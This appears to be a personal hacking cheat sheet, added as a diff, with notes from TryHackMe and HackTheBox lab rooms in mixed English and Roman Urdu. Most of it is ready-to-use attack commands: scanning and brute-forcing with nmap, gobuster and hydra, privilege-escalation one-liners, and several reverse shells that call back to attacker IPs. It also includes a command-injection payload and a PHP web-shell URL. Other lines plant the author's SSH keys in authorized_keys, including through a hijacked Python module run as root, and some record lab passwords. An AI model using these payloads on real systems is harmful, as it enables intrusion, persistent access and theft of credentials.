@@ -1,0 +1,199 @@
+hacking linux server with some vuln
+
+nmap ip 
+nmap -sV ip
+VPN to access tryhacme server
+=> -sV tells us about the open ports and services on those ports
+search for open port exploits
+=> [nmap -sC ip] performs a small VA
+=> -sV -sC scans not all ports but only top 1000 most commonly used port
+=> nmap -p1-65535 (or) nmap -p-
+=> nmap -T1 till -T5 (T1 slowest T5 fastest)
+=> nmap -O ip (OS batayega)  | ping ip (ttl value 60-64=>linux 120-128=>windows) ttl values can be changed
+=> nmap ip -Pn (Ping ke bager check kro)
+nmap ik hi pattern se scanning krta to all firewalls can detect it so we can tell nmap to follow our designed pattern
+
+openvpn filename(to connect to tryhackme [tryhackme ka vpn]) 
+
+Kali me by default smbc ki services mojood hain
+=> smbcliet -L ip
+-L to list shares
+IPC$ by default open hota hai jo ke unimportant hai
+		
+smbclient \\\\<10.10.198.181(Target IP)> (alternate \ escape chr)
+
+smb:> ? (? tells us all the commands )
+ab brute force ke leye do users ke name milgaye in this scenario.
+
+now we do (directory bruteforce)
+gobuster dir -u http://ip(of target) -w (path of wordlist)
+
+status 
+400 hai hi nhi
+500 smhj nhi paya
+300 redirect 
+200 file mojood
+
+achi website bruteforcing ke leye (different wordlist)
+Seclist (github -> discovery -> webcontent)
+
+hydra (bruteforce) (we are using for network bruteforce)
+=> hydra -l (username) -P (pwdlist with path)  ip (ssh)
+-p (single pwd)
+
+password bruteforcing (ik uname multiple pwd)
+password spraying  (ik pwd multiple username)(bhetr)
+
+Kali ke andr search for exploit
+=> searchsploit servicename (ExploitDB command line version)
+
+book.HckTicks.xyz (best website for guidance) 
+LFI (local file inclusion)
+/etc/passwd is readable in linux 
+
+python2 (copy pycode for ghostcat).py ip -p (port for AJP) -p /etc/passwd
+
+powershell remoting(ik machine se dosri machine me jump krna )
+PsExac 
+=>psexac.exe \\<ip> -u <uname> -p<pwd> -i (whoami [any command])
+port 445, 139 open honi chaheye --> smbd ki services se remote access krne ke leye 
+
+=>nc -nv <ip> <port> (netcat similar to nmap)
+
+windows powershell pr
+=> Test-Connection (ip) -port (portno)
+
+=> net user 
+=> net user /domain
+
+This scenario 
+jan@ip 
+password
+
+curl (used for running command in ram of target )
+
+bloodhound github (AD ka map banakr dega kissi bhi domain ke PC pr )
+run krne ke leye do cheezen chaheye 
+1)bloodhound file 
+2)collectors
+
+run option 2 first 
+then import the created file from 2nd to 1st
+
+
+Linux Priv escalation 
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh  
+(or)
+python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export Term=xterm
+stty raw -echo; fg
+
+find / -user elyana -type f 2>/dev/null
+
+echo ‘exec “/bin/sh”’ > copy.sh
+
+echo $(wget https://10.10.205.168/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
+
+web hack using hydra:
+hydra -l admin -P <wordlist> <machine-ip> http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
+
+php -r '$sock=fsockopen("10.6.69.41",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.69.41 4444 >/tmp/f
+
+rsa decrypt using john:
+ssh2john.py id_rsa > hash
+john hash -wordlist=<wordlist>
+
+/bin/bash
+sudo -u \#$((0xffffffff)) /bin/bash
+
+python rev_shell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.69.41",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.69.41 1234 >/tmp/f
+
+'; rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.69.41 4444 >/tmp/f #
+
+
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+echo "/bin/bash -i >& /dev/tcp/10.6.69.41/3457 0>& 1" >> /etc/print.sh
+
+Hacker Test
+
+
+
+zip cracker
+fcrackzip -u -v -D -p ~/Wordlists/rockyou.txt backup.zip
+
+
+
+Thm Gallery
+http://10.10.146.81/gallery/uploads/1692167040_TagorbkumzlpfhqbfnaLetta.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.2.48.33+4444+>/tmp/f
+b3stpassw0rdbr0xx
+
+
+
+CHILL HACK
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0zgSXj1Bs3fe5zgJzUzLmxSuQGR6drVcJxEoGYgt5s3aDEhJIsU1HYqDX5HSNqvPrQ9fB0ETXb9QTjJ1MsEEZUAiolvkUtM7IQYxsm9s54mE2QWvIwRv+jUKl4HFYxziLDTimSU8Ep/nrf/j98F4cTl1GYoJtkmiyS9Ba7bYNCbH1G4oMhPURr1yASth7UxNp4DRVJ+Ryzcguj0fH4M/3abI9qyUq4BLBiptQ54V0bQpX+U1JJH3x5Bhmmn2tfyDJw930hhh7Eoww6hxvljm66u7Zvzz9Ykk7YqD+FyhR6+xKnttqmjX3vh+ofLnKZ9ts3QYXT2S1/WC6WMeLluvgInkCGM79S+Bjuwxq5/gBS0jJn7BNG0I6F/ImE+Tlv+cDkKWYkaCCB6puD8BBvfddRjVOqnPt+ioQIZKzn3x0cPEk8DK3Txw7H4n2kBpSqc7+UVlA0kJmcusfe9K8BOeosGabZzScTz5I9w8dDjZmDLvT8LKFuGxS8o8dlWqBzAs= root@kali" >> /home/apaar/.ssh/authorized_keys
+ssh -L 9001:127.0.0.1:9001 apaar@10.10.215.223 -i id_rsa
+
+
+HTB Responder
+http://unika.htb/?page=10.10.14.73/blahblah
+evil-winrm -i 10.129.17.4 -u administrator -p badminton
+
+
+
+Nessus
+name: Ajlal
+password: ajlal
+enter /bin/systemctl start nessusd.service in terminal
+then goto https://localhost:8834/#/
+
+
+in windows:
+whoami /priv # for checking windows current account priv
+If User has SeImpersonatePrivilege rights.
+then dwonload PrintSpoofer.exe
+run command "PrintSpoofer.exe -i -c cmd"
+
+
+wpscan to get username
+wpscan — url http://10.10.128.23/wordpress/ — enumerate u, ap
+
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                 
+s.connect(("10.6.69.41",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty; pty.spawn("/bin/bash")
+
+sudo -u root /usr/bin/python3 /opt/development/test_modeule.py
+
+
+
+
+
+import os
+class compare:
+  def Str(s1, s2, s3):
+    os.system("mkdir /root/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaSybRsz9ZFTLTB2Mof7GmzBfe5JIrBZN2zJDIsrAYeet8+cI0GpTvuSTD2TzoS9S7ihu6/EjbZLyw+GzON5N1ZU8ZRgGVDGZlSZBWFuA8OsUejifhz95kvIwFQw9zDdQi+7nwPFEGq1CM6S4Q/WLehMzrS0eTgq1MkgW3JAa9p8g5kt9dceoQJuiKWY3ygJHAJKnNsHd87EtGuNf0sTgF+nJaSy1RoZHmoEJ6Ynm8ZjQfaTckdjMZF7IhGUvYfmZRQ6B+M6ku3RHJanRwFY6vyM327JPB2p9vQnOQqPUeWG/forwfaM5JOWzSCLsZAbGrYIdkljZKImvreV+ykjeXBdcN9geYqpM771is15kBZtYLx3AfiQFwDWJkfR7tiswE4jJNUf1VhkDMv9GOs2L5gvgvPuXOL+X9GTl+M9mmQFlkq52pm4u33Ckx87+d6cOsnXwLfxBPgPFCqV3ZebPK+Ht3EtRQndyRIUZAlxykzG2q5h3K3e0EwHVJMUfGtKs= root@kali >> /root/.ssh/authorized_keys")
+
+
+
+Hacker vs Hacker 
+php_revshell.php
+10.6.69.41
+wget http://10.6.69.41:8000/php_revshell.php
+mv php_revshell.php /var/www/html/cvs
+
+
+
+
+
+hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt --force
